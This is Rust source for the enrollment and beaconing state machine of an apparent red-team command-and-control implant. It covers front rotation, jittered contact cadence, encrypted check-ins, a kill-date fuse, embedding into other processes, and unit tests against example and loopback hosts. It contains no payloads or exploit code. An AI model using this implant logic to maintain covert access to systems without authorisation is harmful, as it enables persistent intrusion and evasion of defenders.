use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use crate::enroll::{self, Enrollment, KeyPair};
use crate::handlers::Cadence;
use crate::profile::Profile;
use crate::session::{Attempt, Seal, Session};
use crate::transport::{carriage_for, contact_dial, Contact};

/// The run's end states, mapped to process exits.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Exit {
    /// The artifact's time fuse or the server's permanent answer: stop.
    /// The code is the standalone process's exit -- 0 the clean terminations
    /// (kill date, server refusal), 1 the definitive failures.
    Terminated(u8),
    /// Nothing answered the enrollment walk.
    NoFront,
}

/// Where the machine stands: walking the fronts for its first enrollment,
/// holding contact cycles, or finished. The done phase is sticky.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Phase {
    Enrolling,
    Contacting,
    Done(Exit),
}

/// One pump's outcome for the driving shell.
#[derive(Debug, PartialEq)]
pub enum Step {
    /// An action ran -- an enroll attempt or a whole contact cycle; pump
    /// again for the next.
    Acted,
    /// Nothing is due yet: the driver should wait this long (or spend it on
    /// its own work) before pumping again.
    Wait(Duration),
    /// The machine reached its end state; the exit is final.
    Done(Exit),
}

/// The whole machine as a stepping state machine: enroll once (walking the
/// fronts), then hold contacts against the beacon URLs the same fronts
/// name, reconnecting and walking on failure, until the kill date or a
/// permanent refusal. One `pump` performs the next due action -- an enroll
/// attempt, a contact cycle, or nothing because the cadence says wait --
/// so any host drives it: the standalone process and the carrier thread
/// block on it (through [`run`]), and the C-ABI embedding surface hands
/// the steps to a non-Rust shell's own loop. The nonce floor, the ledger,
/// and the cadence live in the session and survive every reconnect and
/// walk step.
pub struct Machine {
    profile: Profile,
    keys: KeyPair,
    phase: Phase,
    fronts: Vec<String>,
    front: usize,
    last_error: String,
    session: Option<Session>,
    walk: Vec<String>,
    walk_index: usize,
    failures: u32,
    carriage: Option<Box<dyn Contact>>,
    next_due: Instant,
    /// The wait the driver owes before the next pump: the inter-cycle
    /// cadence once a contact scheduled one, or the remaining slice of it.
    pending_wait: Duration,
    contacts: u64,
}

impl Machine {
    /// Builds the machine for a profile. The gates both entries share run
    /// here -- an empty credential and a passed kill date refuse before any
    /// dial -- because a library loaded into another process must never
    /// exit it: the machine answers a terminal phase instead, and the
    /// caller decides what an end state means.
    pub fn new(profile: Profile) -> Machine {
        let mut machine = Machine {
            fronts: profile.enroll_walk(),
            profile,
            keys: KeyPair::generate(),
            phase: Phase::Enrolling,
            front: 0,
            last_error: String::new(),
            session: None,
            walk: Vec::new(),
            walk_index: 0,
            failures: 0,
            carriage: None,
            next_due: Instant::now(),
            pending_wait: Duration::ZERO,
            contacts: 0,
        };
        if machine.profile.token.is_empty() {
            crate::diag!("no enrollment credential (bake or ROD_DEPLOY_TOKEN)");
            machine.phase = Phase::Done(Exit::Terminated(2));
        } else if machine.profile.enroll_url.trim().is_empty() {
            // Dead code for the in-tree entries (an empty enroll URL never
            // loads a profile there); the embedding surface's explicit
            // fields can arrive without one.
            crate::diag!("no enroll front (bake or ROD_ENROLL_URL)");
            machine.phase = Phase::Done(Exit::Terminated(2));
        } else if machine.profile.kill_date_passed() {
            crate::diag!("kill date has passed; refusing to run");
            machine.phase = Phase::Done(Exit::Terminated(2));
        }
        machine
    }

    /// Performs the next due action. The kill date is re-checked on every
    /// step exactly as the standalone loop always did -- the local fuse
    /// bounds a lost implant that can no longer reach any server.
    pub fn pump(&mut self) -> Step {
        if let Phase::Done(exit) = self.phase {
            return Step::Done(exit);
        }
        let session_past = self
            .session
            .as_ref()
            .is_some_and(|session| session.kill_date_passed());
        if session_past || self.profile.kill_date_passed() {
            self.phase = Phase::Done(Exit::Terminated(0));
            return Step::Done(Exit::Terminated(0));
        }
        match self.phase {
            Phase::Enrolling => self.pump_enroll(),
            Phase::Contacting => self.pump_contact(),
            Phase::Done(_) => unreachable!("the entry return holds the done phase"),
        }
    }

    /// The enrollment walk (architecture.md Sec 8): a transport failure
    /// walks to the next front (the credential is unspent against a server
    /// that never answered); a definitive refusal ends the run. One front
    /// per pump; the walk has no inter-front wait, exactly as the blocking
    /// loop never had.
    fn pump_enroll(&mut self) -> Step {
        if self.front >= self.fronts.len() {
            crate::diag!("no enroll front answered ({})", self.last_error);
            self.phase = Phase::Done(Exit::NoFront);
            return Step::Done(Exit::NoFront);
        }
        let url = self.fronts[self.front].clone();
        match enroll::enroll_any(&url, &self.profile, &self.keys) {
            Ok(enrollment) => {
                crate::diag!(
                    "enrolled {} into engagement {}",
                    enrollment.implant_id,
                    enrollment.engagement_id
                );
                if self.enter_contacting(enrollment) {
                    return Step::Acted;
                }
                // The seal refusal failed the run closed; its phase is done.
                let Phase::Done(exit) = self.phase else {
                    unreachable!("a refused entry is terminal");
                };
                Step::Done(exit)
            }
            Err(cause)
                if cause.starts_with("enroll transport") || cause.starts_with("enroll read") =>
            {
                self.last_error = cause;
                self.front += 1;
                Step::Acted
            }
            Err(refusal) => {
                crate::diag!("{refusal}");
                self.phase = Phase::Done(Exit::Terminated(1));
                Step::Done(Exit::Terminated(1))
            }
        }
    }

    /// The enrollment-to-contacts handoff: resolve the seal, open the
    /// session, and build the walk's first carriage. False when the seal
    /// refusal fails the run closed.
    fn enter_contacting(&mut self, enrollment: Enrollment) -> bool {
        let cadence: Cadence = Arc::new(Mutex::new((
            self.profile.sleep_seconds,
            self.profile.jitter_seconds,
        )));
        // A profile that names the sealed carriage but bakes a key the parser
        // refuses must fail closed, the same refusal enrollment makes: contacts
        // would otherwise fall back to plaintext and broadcast the implant's
        // identity and capability list in the clear on every cycle.
        let seal = match resolve_seal(&self.profile) {
            Ok(seal) => seal,
            Err(cause) => {
                crate::diag!("{cause}; refusing to contact in the clear");
                self.phase = Phase::Done(Exit::Terminated(1));
                return false;
            }
        };
        self.session = Some(Session::new(
            enrollment.implant_id.clone(),
            &self.profile.verbs,
            cadence,
            enrollment.ca_chain,
            seal,
            self.profile.kill_date.clone(),
            self.profile.mode != "stream",
        ));
        // Contacts never re-enroll: the artifact's identity is bound, and the
        // walk only crosses fronts. Each front on the enroll walk contributes
        // its contact dial; the carriage is built for the entry the walk points
        // at, so a failed contact advances to the next front's dial and a front
        // that returns is picked up again on the next wrap.
        self.walk = self.fronts.iter().map(|url| contact_dial(url)).collect();
        self.walk_index = 0;
        self.failures = 0;
        self.carriage = Some(carriage_for(&self.walk[0], &self.profile));
        self.next_due = Instant::now();
        self.phase = Phase::Contacting;
        true
    }

    fn pump_contact(&mut self) -> Step {
        let now = Instant::now();
        if now < self.next_due {
            let remaining = self.next_due - now;
            self.pending_wait = remaining;
            return Step::Wait(remaining);
        }
        let session = self.session.as_mut().expect("contacting holds a session");
        let carriage = self.carriage.as_mut().expect("contacting holds a carriage");
        match carriage.attempt(session) {
            Ok(Attempt::Crossed) => {
                self.failures = 0;
                self.contacts += 1;
                self.schedule_next();
                Step::Acted
            }
            Ok(Attempt::Refused) => {
                crate::diag!("the server refused the handshake; terminating");
                self.phase = Phase::Done(Exit::Terminated(0));
                Step::Done(Exit::Terminated(0))
            }
            Err(cause) => {
                crate::diag!("contact ended: {cause}");
                self.failures += 1;
                self.walk_index = (self.walk_index + 1) % self.walk.len();
                self.carriage = Some(carriage_for(&self.walk[self.walk_index], &self.profile));
                self.schedule_next();
                Step::Acted
            }
        }
    }

    /// The cadence point the next contact is due, failures widened.
    fn schedule_next(&mut self) {
        let wait = self
            .session
            .as_ref()
            .expect("contacting holds a session")
            .backoff_wait(self.failures);
        self.pending_wait = wait;
        self.next_due = Instant::now() + wait;
    }

    /// The wait the driver owes before the next pump (0 when an action is
    /// due now) -- the embedding surface's wait_ms.
    pub fn pending_wait(&self) -> Duration {
        self.pending_wait
    }

    pub fn phase(&self) -> Phase {
        self.phase
    }

    /// The terminal exit, once the phase is done.
    pub fn exit(&self) -> Option<Exit> {
        match self.phase {
            Phase::Done(exit) => Some(exit),
            _ => None,
        }
    }

    /// The enrolled implant id, empty before enrollment lands.
    pub fn implant_id(&self) -> &str {
        self.session
            .as_ref()
            .map(|session| session.implant_id.as_str())
            .unwrap_or("")
    }

    /// Contact cycles crossed since enrollment.
    pub fn contacts(&self) -> u64 {
        self.contacts
    }
}

/// The blocking drive of the machine: the standalone process and the
/// carrier thread run it until the end state.
pub fn run(profile: &Profile) -> Exit {
    let mut machine = Machine::new(profile.clone());
    loop {
        match machine.pump() {
            Step::Acted => {}
            Step::Wait(wait) => std::thread::sleep(wait),
            Step::Done(exit) => return exit,
        }
    }
}

/// Resolves the contact seal a profile carries: none for a plaintext
/// carriage, the parsed pair for a sealed one, and an error for a profile
/// that names the sealed carriage but bakes a key the parser refuses --
/// the run fails closed instead of degrading contacts to plaintext.
fn resolve_seal(profile: &Profile) -> Result<Option<Seal>, &'static str> {
    if profile.contact_envelope != "aesgcm" {
        return Ok(None);
    }
    Seal::parse(&profile.envelope_key)
        .map(Some)
        .ok_or("aesgcm contact envelope baked with no usable key")
}

#[cfg(test)]
mod tests {
    use super::*;

    fn profile(contact_envelope: &str, envelope_key: &str) -> Profile {
        Profile {
            enroll_url: "https://front.example".into(),
            fallback_enroll_urls: Vec::new(),
            ca_pem: String::new(),
            tls_trust: "pinned".into(),
            kill_date: None,
            sleep_seconds: 30.0,
            jitter_seconds: 10.0,
            mode: "poll".into(),
            enroll_path: "/implants/enroll".into(),
            user_agent: String::new(),
            headers: Vec::new(),
            request_timeout_seconds: 30.0,
            envelope: "none".into(),
            contact_envelope: contact_envelope.into(),
            envelope_key: envelope_key.into(),
            wg_private_key: String::new(),
            wg_server_key: String::new(),
            token: String::new(),
            verbs: Vec::new(),
        }
    }

    #[test]
    fn a_plaintext_carriage_carries_no_seal() {
        let plain = profile("none", "");
        assert!(resolve_seal(&plain).expect("plaintext resolves").is_none());
    }

    #[test]
    fn a_sealed_carriage_parses_its_key() {
        // base64 of 16 key-id bytes plus 32 key bytes, the bake's packed
        // shape.
        let packed: Vec<u8> = (0u8..48).collect();
        use base64::Engine;
        let key = base64::engine::general_purpose::STANDARD.encode(packed);
        let seal = resolve_seal(&profile("aesgcm", &key))
            .expect("a well-formed bake resolves")
            .expect("and carries a seal");
        assert_eq!(seal.key_id.to_vec(), (0u8..16).collect::<Vec<u8>>());
        assert_eq!(seal.key.to_vec(), (16u8..48).collect::<Vec<u8>>());
    }

    #[test]
    fn a_sealed_carriage_with_an_unusable_key_fails_closed() {
        // The bake names aesgcm but the key is not the packed shape: the
        // refusal is loud, never a silent fallback to plaintext contacts.
        let err = match resolve_seal(&profile("aesgcm", "not-base64-key")) {
            Err(cause) => cause,
            Ok(_) => panic!("a malformed baked key must be refused"),
        };
        assert_eq!(err, "aesgcm contact envelope baked with no usable key");
    }

    #[test]
    fn an_empty_credential_gates_the_machine_terminal_before_any_dial() {
        let mut machine = Machine::new(profile("none", ""));
        assert_eq!(machine.phase(), Phase::Done(Exit::Terminated(2)));
        assert_eq!(machine.pump(), Step::Done(Exit::Terminated(2)));
        assert_eq!(machine.exit(), Some(Exit::Terminated(2)));
        // The gate runs before enrollment: no session ever exists.
        assert_eq!(machine.implant_id(), "");
    }

    #[test]
    fn a_passed_kill_date_gates_the_machine_terminal() {
        let mut gated = profile("none", "");
        gated.token = "t".into();
        gated.kill_date = Some("2020-01-01T00:00:00Z".into());
        let machine = Machine::new(gated);
        assert_eq!(machine.phase(), Phase::Done(Exit::Terminated(2)));
    }

    #[test]
    fn a_dead_front_walk_ends_no_front_after_one_pass() {
        // Port 1 on loopback refuses the connection outright: each enroll
        // attempt is a fast transport failure, and the walk (primary plus
        // fallback) ends NoFront after one pass, as the blocking loop did.
        let mut walking = profile("none", "");
        walking.token = "t".into();
        walking.enroll_url = "http://127.0.0.1:1/implants/enroll".into();
        walking.fallback_enroll_urls = vec!["http://127.0.0.1:2/implants/enroll".into()];
        let mut machine = Machine::new(walking);
        assert_eq!(machine.phase(), Phase::Enrolling);
        assert!(matches!(machine.pump(), Step::Acted));
        assert_eq!(machine.phase(), Phase::Enrolling);
        assert!(matches!(machine.pump(), Step::Acted));
        assert_eq!(machine.pump(), Step::Done(Exit::NoFront));
        // The done phase is sticky.
        assert_eq!(machine.pump(), Step::Done(Exit::NoFront));
        assert_eq!(machine.contacts(), 0);
    }
}
